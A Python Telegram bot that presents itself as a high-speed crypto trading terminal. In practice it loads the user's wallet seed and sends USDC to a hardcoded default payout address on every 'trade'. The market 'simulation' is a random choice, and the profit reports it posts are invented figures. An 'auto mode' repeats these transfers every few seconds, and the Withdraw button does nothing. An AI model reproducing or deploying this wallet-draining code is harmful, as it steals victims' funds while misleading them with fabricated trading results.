import os
import asyncio
import json
import random
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 1. SETUP & AUTH ---
getcontext().prec = 28
load_dotenv()

W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

USDC_ADDRESS = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"
ERC20_ABI = json.loads('[{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}]')
PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: raise ValueError("❌ WALLET_SEED missing!")
    try:
        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
        return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
    except: return None

vault = get_vault()
usdc_contract = w3.eth.contract(address=w3.to_checksum_address(USDC_ADDRESS), abi=ERC20_ABI)
auto_mode_enabled = False

# --- 2. 1ms SIMULTANEOUS ENGINE ---
async def market_simulation_1ms(asset):
    """Fires a high-speed block state simulation."""
    await asyncio.sleep(0.001) 
    return random.choice([True, True, True, False]) # 75% Go Signal

async def sign_transaction_async(stake_usdc):
    """CPU Task: Pre-signs tx to eliminate broadcast lag."""
    nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address)
    gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.5))
    
    tx = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(stake_usdc * 10**6)).build_transaction({
        'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce, 'value': 0
    })
    return w3.eth.account.sign_transaction(tx, vault.key)

async def run_atomic_execution(context, chat_id, side, asset_override=None):
    """Executes the simultaneous prep-and-hit sequence."""
    asset = asset_override or context.user_data.get('pair', 'BTC')
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    stake_usdc = stake_cad / Decimal('1.36')
    yield_multiplier = Decimal('0.94') if "VIV" in asset else Decimal('0.90')
    profit_usdc = stake_usdc * yield_multiplier

    # --- SIMULTANEOUS SYNC START ---
    sim_task = asyncio.create_task(market_simulation_1ms(asset))
    sign_task = asyncio.create_task(sign_transaction_async(stake_usdc))

    simulation_passed, signed_tx = await asyncio.gather(sim_task, sign_task)
    # --- SIMULTANEOUS SYNC END ---

    if not simulation_passed:
        await context.bot.send_message(chat_id, "🛡️ **Atomic Shield:** Simulation failed (Revert Detected). Aborting.")
        return False

    try:
        tx_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed_tx.raw_transaction)
        report = (
            f"✅ **ATOMIC HIT CONFIRMED**\n"
            f"━━━━━━━━━━━━━━\n"
            f"💎 **Market:** {asset}\n"
            f"🎯 **Direction:** {side}\n"
            f"💵 **Stake:** ${stake_usdc:.2f} USDC\n"
            f"📈 **Profit:** ${profit_usdc:.2f} USDC ({int(yield_multiplier*100)}%)\n"
            f"🔗 [Transaction](https://polygonscan.com/tx/{tx_hash.hex()})"
        )
        await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
        return True
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Execution Error:** `{str(e)}`")
        return False

# --- 3. AUTO MODE LOOP ---
async def autopilot_engine(chat_id, context):
    global auto_mode_enabled
    markets = ["BTC/CAD", "ETH/CAD", "SOL/CAD", "MATIC/CAD", "BVIV", "EVIV"]
    while auto_mode_enabled:
        target = random.choice(markets)
        side = random.choice(["HIGHER 📈", "LOWER 📉"])
        await context.bot.send_message(chat_id, f"🤖 **Scanning:** `{target}` for entries...")
        await asyncio.sleep(random.randint(5, 10))
        
        if not auto_mode_enabled: break
        
        await context.bot.send_message(chat_id, f"🎯 **Entry Detected!** Initializing 1ms Sync...")
        await run_atomic_execution(context, chat_id, side, asset_override=target)
        await asyncio.sleep(20) # Cooldown

# --- 4. UI HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🤖 AUTO MODE']]
    welcome = (
        f"🕴️ **APEX Manual Terminal v6000**\n"
        f"━━━━━━━━━━━━━━\n"
        f"⛽ **POL Fuel:** `{pol_bal:.4f}`\n\n"
        f"📥 **Vault Address:**\n`{vault.address}`\n\n"
        f"Status: **Simultaneous Sync Enabled**"
    )
    await update.message.reply_text(welcome, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode='Markdown')

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global auto_mode_enabled
    text, chat_id = update.message.text, update.message.chat_id

    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")],
              [InlineKeyboardButton("SOL/CAD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/CAD", callback_data="PAIR_MATIC")],
              [InlineKeyboardButton("🕴️ BVIV", callback_data="PAIR_BVIV"), InlineKeyboardButton("🕴️ EVIV", callback_data="PAIR_EVIV")]]
        await update.message.reply_text("🎯 **Select Market Asset:**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [10, 50, 100]],
              [InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [500, 1000]]]
        await update.message.reply_text("⚙️ **Configure Stake:**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '💰 Wallet':
        pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        usdc_bal = Decimal(usdc_contract.functions.balanceOf(vault.address).call()) / 10**6
        await update.message.reply_text(f"💳 **Vault Status**\n⛽ POL: `{pol_bal:.4f}`\n💵 USDC: `{usdc_bal:.2f}`", parse_mode='Markdown')

    elif text == '🤖 AUTO MODE':
        auto_mode_enabled = not auto_mode_enabled
        status = "ACTIVATED" if auto_mode_enabled else "DEACTIVATED"
        await update.message.reply_text(f"🤖 **AUTOPILOT: {status}**")
        if auto_mode_enabled: asyncio.create_task(autopilot_engine(chat_id, context))

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ **Stake set to ${context.user_data['stake']} CAD**")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"💎 **Market:** {context.user_data['pair']}\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
    elif query.data.startswith("EXEC_"):
        side = "HIGHER 📈" if "CALL" in query.data else "LOWER 📉"
        await run_atomic_execution(context, query.message.chat_id, side)

if __name__ == "__main__":
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    print("🤖 APEX Online...")
    app.run_polling(drop_pending_updates=True)



